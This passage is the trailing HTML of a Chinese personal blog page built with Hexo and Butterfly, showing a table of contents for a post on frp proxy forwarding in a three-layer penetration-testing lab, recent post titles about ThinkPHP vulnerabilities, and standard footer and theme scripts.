;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#frp%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-number">1.</span> <span class="toc-text">frp代理转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E7%BA%A7%E4%BB%A3%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">一级代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E7%BA%A7%E4%BB%A3%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">二级代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%8B%93%E6%89%91"><span class="toc-number">2.</span> <span class="toc-text">环境拓扑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#target1"><span class="toc-number">3.</span> <span class="toc-text">target1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#target2"><span class="toc-number">4.</span> <span class="toc-text">target2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#target3"><span class="toc-number">5.</span> <span class="toc-text">target3</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/" title="frp--CFS三层靶场渗透">frp--CFS三层靶场渗透</a><time datetime="2024-09-17T13:37:00.402Z" title="发表于 2024-09-17 21:37:00">2024-09-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/" title="CFS三层靶机渗透--msf">CFS三层靶机渗透--msf</a><time datetime="2024-09-16T12:21:14.930Z" title="发表于 2024-09-16 20:21:14">2024-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/tp-V5.1.29/" title="Thinkphp V5.1.x RCE">Thinkphp V5.1.x RCE</a><time datetime="2024-08-07T14:21:10.948Z" title="发表于 2024-08-07 22:21:10">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/05/tp-V6.0.12/" title="ThinkPHP V6.0.12多语言漏洞">ThinkPHP V6.0.12多语言漏洞</a><time datetime="2024-08-05T15:52:12.486Z" title="发表于 2024-08-05 23:52:12">2024-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/02/tp-V5.0.24/" title="ThinkPHP v5.0.24 反序列化">ThinkPHP v5.0.24 反序列化</a><time datetime="2024-08-01T17:41:23.905Z" title="发表于 2024-08-02 01:41:23">2024-08-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By pmj</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
